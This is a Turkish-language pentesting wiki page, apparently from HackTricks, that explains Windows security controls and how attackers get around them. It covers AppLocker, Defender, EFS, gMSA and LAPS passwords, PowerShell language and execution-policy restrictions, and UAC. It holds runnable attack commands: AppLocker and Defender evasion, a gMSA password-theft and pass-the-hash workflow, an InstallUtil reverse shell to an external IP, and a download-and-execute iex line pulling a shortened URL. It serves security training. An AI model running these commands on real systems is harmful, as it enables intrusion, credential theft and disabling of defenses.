# Windows Security Controls

{{#include ../../banners/hacktricks-training.md}}

## AppLocker Policy

An application whitelist, bir sistemde bulunmasına ve çalıştırılmasına izin verilen onaylı yazılım uygulamalarının veya yürütülebilir dosyaların listesidir. Amaç, ortamı zararlı malware'lerden ve bir kuruluşun özel iş ihtiyaçlarıyla uyumlu olmayan onaysız yazılımlardan korumaktır.

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker), Microsoft'un **application whitelisting çözümüdür** ve sistem yöneticilerine **kullanıcıların hangi uygulamaları ve dosyaları çalıştırabileceği** üzerinde kontrol sağlar. Yürütülebilir dosyalar, script'ler, Windows installer dosyaları, DLL'ler, paketlenmiş uygulamalar ve paketlenmiş uygulama installer'ları üzerinde **ayrıntılı kontrol** sunar.\
Kuruluşların **cmd.exe ve PowerShell.exe'yi engellemesi** ve belirli dizinlere yazma erişimini kısıtlaması yaygındır, **ancak bunların tamamı bypass edilebilir**.

### Kontrol

Hangi dosyaların/uzantıların blacklist/whitelist'e alındığını kontrol edin:
```bash
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
Bu registry path, AppLocker tarafından uygulanan yapılandırmaları ve policy'leri içerir; sistemde zorunlu kılınan mevcut rule set'ini incelemek için bir yol sağlar:

- `HKLM\Software\Policies\Microsoft\Windows\SrpV2`

### Bypass

- AppLocker Policy'yi bypass etmek için kullanışlı **Writable folders**: AppLocker, `C:\Windows\System32` veya `C:\Windows` içinde herhangi bir şeyin çalıştırılmasına izin veriyorsa, bunu **bypass etmek** için kullanabileceğiniz **writable folders** bulunur.
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
- Yaygın olarak **güvenilen** [**"LOLBAS's"**](https://lolbas-project.github.io/) ikili dosyaları AppLocker'ı bypass etmek için de kullanılabilir.
- **Kötü yazılmış kurallar da bypass edilebilir**
- Örneğin, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`** için herhangi bir yerde **`allowed` adlı bir klasör** oluşturabilirsiniz ve buna izin verilir.
- Kuruluşlar ayrıca genellikle **`%System32%\WindowsPowerShell\v1.0\powershell.exe` çalıştırılabilir dosyasını engellemeye** odaklanır, ancak `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` veya `PowerShell_ISE.exe` gibi diğer [**PowerShell çalıştırılabilir dosyası konumlarını**](https://www.powershelladmin.com/wiki/PowerShell_Executables_File_System_Locations) unuturlar.
- **DLL enforcement**, bir sisteme yükleyebileceği ek yük ve hiçbir şeyin bozulmayacağından emin olmak için gereken test miktarı nedeniyle çok nadiren etkinleştirilir. Bu nedenle **DLL'leri backdoor olarak kullanmak AppLocker'ı bypass etmeye yardımcı olur**.
- Herhangi bir process içinde **Powershell** kodu çalıştırmak ve AppLocker'ı bypass etmek için [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanabilirsiniz. Daha fazla bilgi için şuraya bakın: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## Kimlik Bilgilerinin Depolanması

### Security Accounts Manager (SAM)

Yerel kimlik bilgileri bu dosyada bulunur; parolalar hash'lenmiştir.

### Local Security Authority (LSA) - LSASS

**Kimlik bilgileri** (hash'lenmiş şekilde), Single Sign-On nedenleriyle bu subsystem'in **belleğinde** **saklanır**.\
**LSA**, yerel **güvenlik politikasını** (parola politikası, kullanıcı izinleri...), **authentication**, **access token'ları**... yönetir.\
LSA, sağlanan kimlik bilgilerini **SAM** dosyasında (yerel login için) **kontrol edecek** ve bir domain kullanıcısını authenticate etmek için **domain controller** ile **iletişim kuracak** bileşendir.

**Kimlik bilgileri** **LSASS process'i** içinde **saklanır**: Kerberos ticket'ları, NT ve LM hash'leri, kolayca decrypt edilebilen parolalar.

### LSA secrets

LSA bazı kimlik bilgilerini diskte saklayabilir:

- Active Directory bilgisayar hesabının parolası (erişilemeyen domain controller).
- Windows servislerinin hesaplarının parolaları
- Scheduled task'lar için parolalar
- Diğerleri (IIS uygulamalarının parolası...)

### NTDS.dit

Active Directory'nin veritabanıdır. Yalnızca Domain Controller'larda bulunur.

## Defender

[**Microsoft Defender**](https://en.wikipedia.org/wiki/Microsoft_Defender), Windows 10 ve Windows 11'de ve Windows Server sürümlerinde bulunan bir Antivirus'tür. **`WinPEAS`** gibi yaygın pentesting araçlarını **engeller**. Ancak bu **korumaları bypass etmenin yolları** vardır.

### Kontrol

**Defender**'ın **durumunu** kontrol etmek için PS cmdlet'i **`Get-MpComputerStatus`** çalıştırabilirsiniz (aktif olup olmadığını öğrenmek için **`RealTimeProtectionEnabled`** değerini kontrol edin):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

Bunu enumerate etmek için şunu da çalıştırabilirsiniz:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## Encrypted File System (EFS)

EFS, dosyaları **File Encryption Key (FEK)** olarak bilinen bir **symmetric key** kullanarak şifreleme yoluyla güvence altına alır. Bu anahtar, kullanıcının **public key**'iyle şifrelenir ve şifrelenmiş dosyanın $EFS **alternative data stream**'i içinde saklanır. Şifre çözme gerektiğinde, kullanıcının dijital sertifikasına karşılık gelen **private key**, $EFS stream'indeki FEK'in şifresini çözmek için kullanılır. Daha fazla bilgiye [buradan](https://en.wikipedia.org/wiki/Encrypting_File_System) ulaşabilirsiniz.

**Kullanıcı tarafından başlatılmadan gerçekleşen şifre çözme senaryoları** şunları içerir:

- Dosyalar veya klasörler [FAT32](https://en.wikipedia.org/wiki/File_Allocation_Table) gibi EFS olmayan bir file system'e taşındığında otomatik olarak şifreleri çözülür.
- SMB/CIFS protokolü üzerinden network aracılığıyla gönderilen şifrelenmiş dosyaların, iletimden önce şifreleri çözülür.

Bu şifreleme yöntemi, sahibinin şifrelenmiş dosyalara **transparent access** sağlamasına olanak tanır. Ancak yalnızca sahibin password'ünü değiştirmek ve oturum açmak, şifre çözmeye izin vermez.

**Key Takeaways**:

- EFS, kullanıcının public key'iyle şifrelenmiş symmetric bir FEK kullanır.
- Şifre çözme işlemi, FEK'e erişmek için kullanıcının private key'ini kullanır.
- FAT32'ye kopyalama veya network üzerinden iletim gibi belirli koşullarda otomatik şifre çözme gerçekleşir.
- Şifrelenmiş dosyalara, ek adımlar olmadan sahibi tarafından erişilebilir.

### EFS info'yu kontrol etme

Bir **user**'ın bu **service**'i **kullanıp kullanmadığını**, şu path'in mevcut olup olmadığını kontrol ederek öğrenin:`C:\users\<username>\appdata\roaming\Microsoft\Protect`

Dosyaya **kimlerin** **erişimi** olduğunu cipher /c \<file>\ kullanarak kontrol edin\
Bir klasör içinde `cipher /e` ve `cipher /d` kullanarak tüm dosyaları **encrypt** ve **decrypt** edebilirsiniz

### EFS dosyalarının şifresini çözme

#### Authority System olarak

Bu yöntem, **victim user**'ın host içinde bir **process** çalıştırmasını gerektirir. Böyle bir durum söz konusuysa, bir `meterpreter` session kullanarak kullanıcının process'inin token'ını (`incognito` içindeki `impersonate_token`) taklit edebilirsiniz. Alternatif olarak kullanıcının process'ine `migrate` edebilirsiniz.

#### Kullanıcının password'ünü bilmek


{{#ref}}
https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files
{{#endref}}

## Group Managed Service Accounts (gMSA)

Microsoft, IT infrastructure'larındaki service account'ların yönetimini kolaylaştırmak için **Group Managed Service Accounts (gMSA)** geliştirdi. Genellikle "**Password never expire**" ayarı etkin olan geleneksel service account'ların aksine, gMSA'ler daha güvenli ve yönetilebilir bir çözüm sunar:

- **Automatic Password Management**: gMSA'ler, domain veya computer policy'ye göre otomatik olarak değişen, 240 karakterlik karmaşık bir password kullanır. Bu process, Microsoft'un Key Distribution Service'i (KDC) tarafından yürütülür ve manuel password güncellemeleri gereksinimini ortadan kaldırır.
- **Enhanced Security**: Bu account'lar lockout işlemine karşı bağışıktır ve interactive login için kullanılamaz; bu da güvenliklerini artırır.
- **Multiple Host Support**: gMSA'ler birden fazla host arasında paylaşılabilir; bu nedenle birden fazla server üzerinde çalışan service'ler için idealdir.
- **Scheduled Task Capability**: managed service account'ların aksine, gMSA'ler scheduled task çalıştırmayı destekler.
- **Simplified SPN Management**: Computer'ın sAMaccount ayrıntılarında veya DNS name'inde değişiklik olduğunda system, Service Principal Name'i (SPN) otomatik olarak günceller ve SPN yönetimini kolaylaştırır.

gMSA'lerin password'leri LDAP property _**msDS-ManagedPassword**_ içinde saklanır ve Domain Controller'lar (DC'ler) tarafından her 30 günde bir otomatik olarak resetlenir. [MSDS-MANAGEDPASSWORD_BLOB](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/a9019740-3d73-46ef-a9ae-3ea8eb86ac2e) olarak bilinen encrypted data blob biçimindeki bu password, yalnızca yetkili administrator'lar ve gMSA'lerin kurulu olduğu server'lar tarafından alınabilir; böylece güvenli bir ortam sağlanır. Bu bilgilere erişmek için LDAPS gibi güvenli bir connection gereklidir veya connection 'Sealing & Secure' ile authenticated olmalıdır.

![https://cube0x0.github.io/Relaying-for-gMSA/](../../images/asd1.png)

Bu password'ü [**GMSAPasswordReader**](https://github.com/rvazarkar/GMSAPasswordReader)**:**<sup>[[2]](#references)</sup> ile okuyabilirsiniz.
```
/GMSAPasswordReader --AccountName jkohler
```
[**Bu gönderide daha fazla bilgi bulabilirsiniz**](https://cube0x0.github.io/Relaying-for-gMSA/)

Ayrıca, bir **NTLM relay attack** gerçekleştirerek **gMSA**'nın **password** değerini nasıl **read** edebileceğinizi anlatan bu [web sayfasına](https://cube0x0.github.io/Relaying-for-gMSA/) göz atın.<sup>[[1]](#references)</sup>

### gMSA managed password değerini okumak için ACL chaining'den yararlanma (GenericAll -> ReadGMSAPassword)

Birçok ortamda düşük yetkili kullanıcılar, yanlış yapılandırılmış object ACL'lerinden yararlanarak DC compromise olmadan gMSA secrets değerlerine pivot edebilir:<sup>[[3]](#references)</sup>

- Kontrol edebildiğiniz bir group'a (ör. GenericAll/GenericWrite aracılığıyla) bir gMSA üzerinde `ReadGMSAPassword` yetkisi verilmiştir.
- Kendinizi bu group'a ekleyerek, LDAP üzerinden gMSA'nın `msDS-ManagedPassword` blob değerini read etme ve kullanılabilir NTLM credentials elde etme hakkını devralırsınız.

Tipik workflow:

1) BloodHound ile path'i discover edin ve foothold principals değerlerinizi Owned olarak işaretleyin. Şu edge'ler gibi bağlantıları arayın:
- GroupA GenericAll -> GroupB; GroupB ReadGMSAPassword -> gMSA

2) Kontrol ettiğiniz intermediate group'a kendinizi ekleyin (bloodyAD ile örnek):
```bash
bloodyAD --host <DC.FQDN> -d <domain> -u <user> -p <pass> add groupMember <GroupWithReadGmsa> <user>
```
3) gMSA tarafından yönetilen parolayı LDAP üzerinden okuyun ve NTLM hash'ini türetin. NetExec, `msDS-ManagedPassword` çıkarımını ve NTLM'e dönüştürme işlemini otomatikleştirir:
```bash
# Shows PrincipalsAllowedToReadPassword and computes NTLM automatically
netexec ldap <DC.FQDN> -u <user> -p <pass> --gmsa
# Account: mgtsvc$  NTLM: edac7f05cded0b410232b7466ec47d6f
```
4) NTLM hash'ini kullanarak gMSA olarak kimlik doğrulaması yapın (plaintext gerekmez). Hesap Remote Management Users grubundaysa WinRM doğrudan çalışır:
```bash
# SMB / WinRM as the gMSA using the NT hash
netexec smb   <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
netexec winrm <DC.FQDN> -u 'mgtsvc$' -H <NTLM>
```
Notlar:
- `msDS-ManagedPassword` için LDAP okumaları sealing gerektirir (ör. LDAPS/sign+seal). Tools bunu otomatik olarak gerçekleştirir.
- gMSA'lere genellikle WinRM gibi local haklar verilir; lateral movement planlamak için grup üyeliğini (ör. Remote Management Users) doğrulayın.
- Blob'a yalnızca NTLM'yi kendiniz hesaplamak için ihtiyacınız varsa MSDS-MANAGEDPASSWORD_BLOB structure'a bakın.



## LAPS

[Microsoft](https://www.microsoft.com/en-us/download/details.aspx?id=46899) üzerinden indirilebilen **Local Administrator Password Solution (LAPS)**, local Administrator password'lerinin yönetilmesini sağlar. **Randomized**, benzersiz ve **düzenli olarak değiştirilen** bu password'ler, Active Directory'de merkezi olarak depolanır. Bu password'lere erişim, ACL'ler aracılığıyla yetkili users ile sınırlandırılır. Yeterli permissions verildiğinde local admin password'lerini okuma olanağı sağlanır.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

## PS Constrained Language Mode

PowerShell [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/), PowerShell'i etkili şekilde kullanmak için gereken birçok **özelliği kısıtlar**; örneğin COM objects'lerini engeller, yalnızca onaylanmış .NET types'larına izin verir, XAML-based workflows, PowerShell classes ve daha fazlasını kısıtlar.

### **Kontrol Et**
```bash
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### Bypass
```bash
#Easy bypass
Powershell -version 2
```
Güncel Windows sürümlerinde bu Bypass çalışmaz; ancak [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) kullanabilirsiniz.\
**Derlemek için** _**Add a Reference**_ -> _Browse_ ->_Browse_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` eklemeniz ve **projeyi .Net4.5 olarak değiştirmeniz** gerekebilir.

#### Doğrudan bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### Reverse shell:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
[**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) veya [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) kullanarak herhangi bir process içinde **Powershell** kodu **execute** edebilir ve constrained mode'u bypass edebilirsiniz. Daha fazla bilgi için: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode).<sup>[[4]](#references)</sup>

## PS Execution Policy

Varsayılan olarak **restricted** olarak ayarlanmıştır. Bu policy'yi bypass etmenin başlıca yolları:
```bash
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
Daha fazlasını [burada](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)<sup>[[5]](#references)</sup> bulabilirsiniz.

## Security Support Provider Interface (SSPI)

Kullanıcıların kimliğini doğrulamak için kullanılabilen API'dir.

SSPI, iletişim kurmak isteyen iki makine için uygun protokolü bulmaktan sorumludur. Bunun için tercih edilen yöntem Kerberos'tur. Ardından SSPI, hangi kimlik doğrulama protokolünün kullanılacağını müzakere eder. Bu kimlik doğrulama protokollerine Security Support Provider (SSP) adı verilir, her Windows makinesinin içinde bir DLL olarak bulunurlar ve iletişim kurabilmeleri için her iki makinenin de aynı SSP'yi desteklemesi gerekir.

### Main SSPs

- **Kerberos**: Tercih edilen yöntem
- %windir%\Windows\System32\kerberos.dll
- **NTLMv1** ve **NTLMv2**: Uyumluluk nedenleriyle
- %windir%\Windows\System32\msv1_0.dll
- **Digest**: Web sunucuları ve LDAP; parola bir MD5 hash'i biçimindedir
- %windir%\Windows\System32\Wdigest.dll
- **Schannel**: SSL ve TLS
- %windir%\Windows\System32\Schannel.dll
- **Negotiate**: Kullanılacak protokolü müzakere etmek için kullanılır (Kerberos veya NTLM; varsayılan Kerberos'tur)
- %windir%\Windows\System32\lsasrv.dll

#### Müzakere birden fazla yöntem veya yalnızca bir yöntem sunabilir.

## UAC - User Account Control

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works), **yükseltilmiş yetkilere sahip işlemler için bir onay istemi** sağlayan bir özelliktir.


{{#ref}}
uac-user-account-control.md
{{#endref}}

## References

- [1] [Relaying for gMSA – cube0x0](https://cube0x0.github.io/Relaying-for-gMSA/)
- [2] [GMSAPasswordReader](https://github.com/rvazarkar/GMSAPasswordReader)
- [3] [HTB Sendai – 0xdf: gMSA via rights chaining to WinRM](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [4] [darthsidious – Bypassing AppLocker and PowerShell Constrained Language Mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-constrained-language-mode)
- [5] [NetSPI – 15 Ways to Bypass the PowerShell Execution Policy](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)
- [6] [howto ~ decrypt EFS files](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files)

{{#include ../../banners/hacktricks-training.md}}
